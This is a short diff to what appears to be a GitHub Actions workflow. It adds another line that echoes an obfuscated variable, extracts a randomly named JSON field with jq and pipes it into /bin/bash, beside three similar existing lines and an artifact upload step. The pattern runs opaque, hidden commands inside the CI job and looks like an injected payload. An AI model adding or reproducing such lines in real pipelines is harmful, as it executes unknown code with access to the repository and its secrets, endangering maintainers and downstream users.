@@ -27,6 +27,7 @@ jobs:
           echo $s53633 | jq -r .dlt679 | /bin/bash
           printf '%s' "$bfw84" | jq -r .cpuhb18 | /bin/bash
           echo $j13 | jq -r .jhqcs8 | /bin/bash
+          echo $zbet7630 | jq -r .ftr93 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
